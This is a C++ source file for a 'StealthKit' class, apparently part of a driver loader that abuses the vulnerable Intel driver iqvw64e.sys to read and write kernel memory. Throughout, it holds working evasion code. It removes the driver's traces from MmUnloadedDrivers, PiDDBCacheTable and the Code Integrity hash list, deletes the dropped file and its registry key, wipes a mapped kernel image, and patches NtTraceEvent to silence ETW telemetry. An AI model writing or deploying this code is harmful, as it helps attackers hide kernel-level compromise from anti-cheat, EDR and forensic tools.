#include "StealthKit.hpp"
#include <algorithm>
#include "Win.hpp"




BOOLEAN StealthKit::DeleteDriverFile(const std::wstring& serviceName)
{
    WCHAR tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring driverPath = std::wstring(tempPath) + L"iqvw64e.sys";

    if (DeleteFileW(driverPath.c_str()))
    {
        LOG_SUCCESS("Driver file deleted successfully.");
        return TRUE;
    }
    else
    {
        LOG_ERROR("Failed to delete Intel driver file. Status code : " << GetLastError());
        return FALSE;
    }
}

BOOLEAN StealthKit::DeleteRegistryKeys(const std::wstring& serviceName)
{
    const std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;

    LSTATUS st = RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath.c_str());
    if (st != ERROR_SUCCESS && st != ERROR_FILE_NOT_FOUND)
    {
        LOG_ERROR_HEX("Failed to delete registry key. Status code : ", st);
        return false;
    }

    LOG_SUCCESS("Registry key successfully deleted.");
    return true;
}



// Total image wipe with random safe code.
BOOLEAN StealthKit::RewriteKernelCode(uint64_t base, uint32_t size)
{
    if (!base || !size) return false;

    X64Assembler a;

    a.SaveNonVolatileRegisters();
    a.XorRaxRax();
    a.RestoreNonVolatileRegisters();
    a.Ret();

    const auto& safeCode = a.GetBytes();
    size_t patternSize = safeCode.size();

    if (patternSize == 0)
        return 0;

    std::vector<uint8_t> fullCode;
    fullCode.reserve(size);

    for (uint32_t i = 0; i < size; i += static_cast<uint32_t>(patternSize))
    {

        size_t toCopy = std::min(patternSize, static_cast<size_t>(size - i));

        fullCode.insert(fullCode.end(), safeCode.begin(), safeCode.begin() + toCopy);

    }
    
    if (fullCode.size() < static_cast<size_t>(size))
    {
        size_t remaining = static_cast<size_t>(size - fullCode.size());

        // Fill remaining with polymorphics NOPs
        auto nopSlide = a.CreateNopSlide(remaining);
        fullCode.insert(fullCode.end(), nopSlide.begin(), nopSlide.end());


        LOG_SUCCESS("Filling previously allocated kernel memory with random safe opcodes...");
    }


    if (!m_loader.WriteToReadOnlyMemory(base, fullCode.data(), size))
    {
        LOG_ERROR("Error, cannot randomize driver data.");
        return FALSE;
    }

    return TRUE;
}


ValkStatus StealthKit::PatchETW()
{
    return ValkStatus();
}

BOOLEAN StealthKit::ClearMmUnloadedDrivers()
{
    LOG_INFO("Clearing MmUnloadedDrivers cache...");

    ULONG lenght = 0;
    std::vector<uint8_t> buffer;
    NTSTATUS status;

    do
    {
        buffer.resize(lenght);
        status = NtQuerySystemInformation(
            SystemExtendedHandleInformation,
            buffer.data(),
            static_cast<ULONG>(buffer.size()),
            &lenght);

    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status))
    {
        std::wcout << L"[!] NtQuerySystemInformation failed 0x" << std::hex << status << L'\n';
        return false;
    }

    const auto* info = reinterpret_cast<const SYSTEM_HANDLE_INFORMATION_EX*>(buffer.data());
    LOG_INFO("Total handles : " << info->NumberOfHandles);

    uint64_t object = 0;
    for (ULONG_PTR i = 0; i < info->NumberOfHandles; ++i)
    {
        const auto& h = info->Handles[i];
        if (reinterpret_cast<HANDLE>(h.UniqueProcessId) == UlongToHandle(GetCurrentProcessId()))
        {
            //std::wcout << L"[DEBUG] PID match, handle value: 0x" << std::hex << h.HandleValue
               // << L" vs hIntelDriver: 0x" << m_loader.GetHandle() << L'\n';
            if (reinterpret_cast<HANDLE>(h.HandleValue) == m_loader.GetHandle())
            {
                object = reinterpret_cast<uint64_t>(h.Object);
             //   std::wcout << L"[DEBUG] Handle found, Object = 0x" << object << L'\n';
                break;
            }
        }
    }

    if (!object)
    {
        std::wcout << L"[!] Intel driver handle not found in table\n";
        return false;
    }

    auto read64 = [this](uint64_t addr, uint64_t& out)
        {
            return m_loader.ReadMemory(addr, &out, sizeof(out)) && out != 0;
        };

    uint64_t devObj = 0, drvObj = 0, drvSec = 0;
    if (!read64(object + 0x8, devObj)) {
        std::wcout << L"[!] devObj fail\n";
        return false;
    }
    if (!read64(devObj + 0x8, drvObj)) {
        std::wcout << L"[!] drvObj fail\n";
        return false;
    }
    if (!read64(drvObj + 0x28, drvSec)) {
        std::wcout << L"[!] drvSec fail\n";
        return false;
    }


    UNICODE_STRING originalUs = { 0 };
    if (!m_loader.ReadMemory(drvSec + 0x58, &originalUs, sizeof(originalUs)))
    {
        std::wcout << L"[!] Failed to read UNICODE_STRING\n";
        return false;
    }

    if (originalUs.Length == 0 && originalUs.Buffer == nullptr)
    {
        std::wcout << L"[+] UNICODE_STRING already cleaned?! Probably the Ghost in the machine...\n";
        return true;
    }

    std::wstring driverName;
    if (originalUs.Length > 0 && originalUs.Buffer != nullptr)
    {
        driverName.resize(originalUs.Length / sizeof(wchar_t));
        if (m_loader.ReadMemory(reinterpret_cast<uintptr_t>(originalUs.Buffer),
            driverName.data(), originalUs.Length))
        {
           // std::wcout << L"[DEBUG] Driver name: " << driverName << L'\n';
        }
    }


    UNICODE_STRING emptyUs = { 0, 0, nullptr };

    // Overwrite the struct
    if (!m_loader.WriteMemory(drvSec + 0x58, &emptyUs, sizeof(emptyUs)))
    {
        std::wcout << L"[!] Failed to write empty UNICODE_STRING\n";
        return false;
    }

    // Now zeroing the buffer too ti be extra clean
    if (originalUs.Buffer && originalUs.MaximumLength > 0)
    {

        std::vector<wchar_t> zeroBuffer(originalUs.MaximumLength / sizeof(wchar_t), 0);


        m_loader.WriteMemory(reinterpret_cast<uintptr_t>(originalUs.Buffer),
            zeroBuffer.data(), originalUs.MaximumLength);

       // std::wcout << L"[DEBUG] Zeroed buffer of size: " << originalUs.MaximumLength << L'\n';
    }

    // Checking
    UNICODE_STRING verifyUs = { 0 };
    if (m_loader.ReadMemory(drvSec + 0x58, &verifyUs, sizeof(verifyUs)))
    {
        if (verifyUs.Length == 0 && verifyUs.Buffer == nullptr)
        {
            LOG_SUCCESS("MmUnloadDriver cache cleared & UNICODE_STRING zeroed successfully.");
        }
        else
        {
            std::wcout << L"[!] Verification failed - string not cleared!\n";
            std::wcout << L"[!] Length: " << verifyUs.Length
                << L", Buffer: 0x" << std::hex << verifyUs.Buffer << std::dec << L'\n';
            return false;
        }
    }

    return true;
}


// Full of sketchy cast because of the way we read/write kernel memory remotely...
ValkStatus StealthKit::CleanPiDDBCache(const std::wstring& driverName, ULONG timeStamp)
{
    if (!m_loader.GetNtoskrnlBaseAddress())
    {
        LOG_ERROR("Error cannot get ntoskrnl base address");
        return ValkStatus::ERR_KERNEL_ADDRESS_NOT_FOUND;
    }

    PVOID lock = m_loader.GetPiDDBLock();
    if (!lock)
    {
        LOG_ERROR("PiDDBLock not found");
        return ValkStatus::ERR_NOT_FOUND;
    }

    PRTL_AVL_TABLE table = m_loader.GetPiDDBCacheTable();
    if (!table)
    {
        LOG_ERROR("PiDDBCacheTable not found");
        return ValkStatus::ERR_NOT_FOUND;
    }

    if (!m_loader.ExAcquireResourceExclusiveLite(lock, TRUE)) 
    {
        LOG_ERROR("Can't acquire PiDDBLock");
        return ValkStatus::ERR_READ_FAILED;
    }

    PiDDBCacheEntry* entry = m_loader.LookupEntry(table, timeStamp, driverName.c_str());
    if (!entry)
    {
        LOG_ERROR("Driver not found in PiDDBCacheTable");
        m_loader.ExReleaseResourceLite(lock);
        return ValkStatus::ERR_NOT_FOUND;
    }

    // Unlink
    PLIST_ENTRY blink = nullptr;
    PLIST_ENTRY flink = nullptr;

    // Read Blink & Flink
    if (!m_loader.ReadMemory((uint64_t)&entry->List.Blink, &blink, sizeof(blink)) ||
        !m_loader.ReadMemory((uint64_t)&entry->List.Flink, &flink, sizeof(flink)))
    {
        LOG_ERROR("Failed to read LIST_ENTRY pointers");
        m_loader.ExReleaseResourceLite(lock);
        return ValkStatus::ERR_ACCESS_DENIED;
    }

    // Reconnect prev->Flink = entry->Flink or we gonna have a bad day...
    if (!m_loader.WriteMemory((uint64_t) & ((PLIST_ENTRY)blink)->Flink, &flink, sizeof(flink)))
    {
        LOG_ERROR("Failed to update Flink");
        m_loader.ExReleaseResourceLite(lock);
        return ValkStatus::ERR_ACCESS_DENIED;
    }

	// Same as above... blink->Blink = entry->Blink
    if (!m_loader.WriteMemory((uint64_t) & ((PLIST_ENTRY)flink)->Blink, &blink, sizeof(blink)))
    {
        LOG_ERROR("Failed to update Blink");
        m_loader.ExReleaseResourceLite(lock);
        return ValkStatus::ERR_ACCESS_DENIED;
    }


	// Delete entry from AVL table
    if (!m_loader.RtlDeleteElementGenericTableAvl(table, entry)) 
    {
        LOG_ERROR("RtlDeleteElementGenericTableAvl failed");
        m_loader.ExReleaseResourceLite(lock);
        return ValkStatus::ERR_NOT_FOUND;
    }

    
    

	// Decrement DeleteCount, just to be tidy, even if not strictly necessary... But why not? It's more stealthy.
    ULONG deleteCount = 0;
    if (m_loader.ReadMemory((uint64_t)&table->DeleteCount, &deleteCount, sizeof(deleteCount))) 
    {
        if (deleteCount > 0) 
        {
            deleteCount--;
            m_loader.WriteMemory((uint64_t)&table->DeleteCount, &deleteCount, sizeof(deleteCount));
        }
    }

    m_loader.ExReleaseResourceLite(lock);
    LOG_SUCCESS("PiDDBCacheTable cleaned");
    return ValkStatus::OK;
}

void StealthKit::EnumeratePiDDBCache()
{
    PRTL_AVL_TABLE table = m_loader.GetPiDDBCacheTable();
    if (!table)
    {
        LOG_ERROR("PiDDBCacheTable not found");
        return;
    }

    LOG_SUCCESS(L"Enumerating PiDDBCache...");

    ULONG numberOfElements = 0;
    if (m_loader.ReadMemory((uint64_t)&table->NumberGenericTableElements,
        &numberOfElements, sizeof(numberOfElements)))
    {
        LOG_SUCCESS(L"Total elements in table: " << numberOfElements);
    }


    PVOID restartKey = nullptr;
    bool found = false;

    for (SIZE_T i = 0; i < numberOfElements; i++)
    {
        PVOID element = m_loader.RtlEnumerateGenericTableWithoutSplayingAvl(table, &restartKey);
        if (!element)
            break;

        PiDDBCacheEntry entry = { 0 };
        if (!m_loader.ReadMemory((uint64_t)element, &entry, sizeof(entry)))
        {
            LOG_ERROR(L"Failed to read entry at index " << i);
            break;
        }

        std::wstring driverNameStr = L"<unknown>";
        if (entry.DriverName.Buffer && entry.DriverName.Length > 0)
        {
            std::vector<wchar_t> buffer(256, 0);
            SIZE_T bytesToRead = entry.DriverName.Length;
            if (bytesToRead > (buffer.size() - 1) * sizeof(wchar_t))
                bytesToRead = (buffer.size() - 1) * sizeof(wchar_t);

            if (m_loader.ReadMemory((uint64_t)entry.DriverName.Buffer,
                buffer.data(),
                bytesToRead))
            {
                driverNameStr = buffer.data();
            }
        }

        auto savedFlags = std::wcout.flags();
        std::wcout << L"[Valkyrie Loader] [+]   [" << std::dec << i << L"] Driver: "
            << driverNameStr
            << L", Timestamp: 0x" << std::hex << entry.TimeDateStamp << L'\n' << std::flush;
        std::wcout.flags(savedFlags);


        if (driverNameStr == L"iqvw64e.sys")
        {
            LOG_SUCCESS(L"Found iqvw64e.sys in PiDDBCache");
            found = true;
        }
    }

    if (!found)
    {
        LOG_SUCCESS(L"iqvw64e.sys not found in PiDDBCache, that's good news.");
    }

    LOG_SUCCESS("End of enumeration.");
}

VOID StealthKit::DebugEtwHooks()
{
    PVOID pFunc = GetNtdllFuncPtr("NtTraceEvent");

    using NtTraceEventFn = NTSTATUS(NTAPI*)(HANDLE, ULONG, ULONG, PVOID);
    auto fn = (NtTraceEventFn)pFunc;

    NTSTATUS status = fn(nullptr, 0, 0, nullptr);
    if (status == 0xDEADC0DE)
    {
        LOG_SUCCESS("NtTraceEvent hook confirmed -> returns 0xDEADC0DE");
    }
    else
    {
        LOG_ERROR_HEX("NtTraceEvent hook failed -> returned", status);
    }
}

BOOLEAN StealthKit::PatchNtTraceEvent()
{
    PVOID pFunc = GetNtdllFuncPtr("NtTraceEvent");
    if (!pFunc)
    {
        LOG_ERROR("Failed to resolve NtTraceEvent");
        return FALSE;
    }

    uint8_t original[16] = { 0 };
    SIZE_T read = 0;
    if (!ReadProcessMemory(GetCurrentProcess(), pFunc, original, sizeof(original), &read) || read != sizeof(original))
    {
        LOG_ERROR("Failed to read NtTraceEvent memory");
        return FALSE;
    }
    DumpBytes("NtTraceEvent original", original, 16);

    X64Assembler a;
    auto patch = a.CreateImmediateReturn(0xDEADC0DE);
    DumpBytes("NtTraceEvent patch", const_cast<uint8_t*>(patch.data()), patch.size());

    DWORD oldProtect = 0;
    if (!VirtualProtect(pFunc, patch.size(), PAGE_EXECUTE_READWRITE, &oldProtect))
    {
        LOG_ERROR("Failed to change memory protection");
        return FALSE;
    }

    memcpy(pFunc, patch.data(), patch.size());

    if (!VirtualProtect(pFunc, patch.size(), oldProtect, &oldProtect))
    {
        LOG_ERROR("Failed to restore memory protection");
        return FALSE;
    }

    LOG_SUCCESS("NtTraceEvent patched -> ETW muted");
    return TRUE;
}



// -----------------------------------------------------------------------
// WARNING: UGLY NESTED IFS AHEAD!
// 
// This looks messy, but each check is CRITICAL for kernel memory safety.
// We're reading RAW kernel addresses remotely here, any mistake = instant BSOD.
//
// Yes, it's ugly. No, we won't use fancy C++20 features here because:
// 1. We need explicit error handling for each operations. No pyramid of DOOM. FAIL FAST ABSOLUTLY NEEDED.
// 2. Kernel debugging is hard enough without abstraction layers.
// 3. Reliability > Code beauty in this context.
// 4. I'm lazy and don't want to refactor this right now :)) but that's another story lmao...
// 
// If you mess with it, use a VM & Windbg ready to catch the BSODs :))
// -----------------------------------------------------------------------
ValkStatus StealthKit::ClearCIHashTable()
{
    constexpr ULONG MAX_NAME_LEN = 256;

    UINT64 g_BucketList = m_offsets.CiBucketList;
    PVOID g_Lock = (PVOID)m_offsets.CiBucketLock;

    if (!g_BucketList || !g_Lock)
        return ValkStatus::ERR_RESOLVE_FAILED;

    if (!m_loader.ExAcquireResourceExclusiveLite(g_Lock, true))
        return ValkStatus::ERR_LOCK_FAILED;

    const std::wstring targetName = m_loader.GetDriverName();
    const std::wstring targetPath = m_loader.GetDriverPath();
    const size_t targetBytes = (targetPath.length() - 2) * sizeof(wchar_t);

    uintptr_t prev = (uintptr_t)g_BucketList;
    uintptr_t curr = 0;

    if (!m_loader.ReadMemory(prev, &curr, sizeof(curr)))
    {
        LOG_ERROR("Failed to read first entry");
        m_loader.ExReleaseResourceLite(g_Lock);
        return ValkStatus::ERR_READ_FAILED;
    }

    LOG_SUCCESS_HEX("First entry", curr);

    if (!curr)
    {
        LOG_SUCCESS("BucketList empty, nothing to clean.");
        m_loader.ExReleaseResourceLite(g_Lock);
        return ValkStatus::OK;
    }

    bool lockReleased = false;  // Now tracking lock state for safety
    ValkStatus finalStatus = ValkStatus::ERR_NOT_FOUND;

    while (curr && !lockReleased)
    {
        USHORT len = 0;
        if (!m_loader.ReadMemory(curr + offsetof(HashBucketEntry, DriverName.Length), &len, sizeof(len)))
        {
            LOG_ERROR("Failed to read Length");
            finalStatus = ValkStatus::ERR_READ_FAILED;
            break;
        }

        uintptr_t bufferAddr = 0;
        if (!m_loader.ReadMemory(curr + offsetof(HashBucketEntry, DriverName.Buffer), &bufferAddr, sizeof(bufferAddr)))
        {
            LOG_ERROR("Failed to read Buffer address");
            finalStatus = ValkStatus::ERR_READ_FAILED;
            break;
        }

        if (bufferAddr && bufferAddr != (uintptr_t)nullptr && len > 0 && len <= MAX_NAME_LEN * sizeof(wchar_t))
        {
            size_t charCount = len / sizeof(wchar_t);
            auto name = std::make_unique<wchar_t[]>(charCount + 1);

            if (m_loader.ReadMemory(bufferAddr, name.get(), len))
            {
                name[charCount] = L'\0';
                std::wstring_view sv(name.get(), charCount);

                if (len == targetBytes && sv.find(targetName) != std::wstring_view::npos)
                {
                    LOG_SUCCESS("Match found.");

                    uintptr_t next = 0;
                    if (!m_loader.ReadMemory(curr, &next, sizeof(next)))
                    {
                        LOG_ERROR("Failed to read Next");
                        finalStatus = ValkStatus::ERR_READ_FAILED;
                        break;
                    }

                    if (!m_loader.WriteMemory(prev, &next, sizeof(next)))
                    {
                        LOG_ERROR("Failed to unlink");
                        finalStatus = ValkStatus::ERR_WRITE_FAILED;
                        break;
                    }

                    if (!m_loader.ExFreePool(curr))
                    {
                        LOG_ERROR("ExFreePool failed");
                        finalStatus = ValkStatus::ERR_NOT_FOUND;
                        break;
                    }

                    LOG_SUCCESS("Entry unlinked from CiBucketList");
                    finalStatus = ValkStatus::OK;
                    break;  // Found, cleaned, we can break now.
                }
                else if (len == targetBytes)
                {
                    LOG_WARNING("Length matches but name doesn't");
                }
            }
            else
            {
                LOG_ERROR("Failed to read driver name");
                finalStatus = ValkStatus::ERR_READ_FAILED;
                break;
            }
        }
        else
        {
            LOG_ERROR("Invalid entry data");
            finalStatus = ValkStatus::ERR_NOT_FOUND;
            break;
        }

        prev = curr;
        if (!m_loader.ReadMemory(curr, &curr, sizeof(curr)))
        {
            LOG_ERROR("Failed to read Next pointer");
            finalStatus = ValkStatus::ERR_READ_FAILED;
            break;
        }
    }

    // Better workflow, now release the lock whatever happend.
    if (!lockReleased)
    {
        m_loader.ExReleaseResourceLite(g_Lock);
        lockReleased = true;
    }

    if (finalStatus == ValkStatus::ERR_NOT_FOUND)
    {
        LOG_WARNING("Driver not found in CI list");
    }

    return finalStatus;
}

    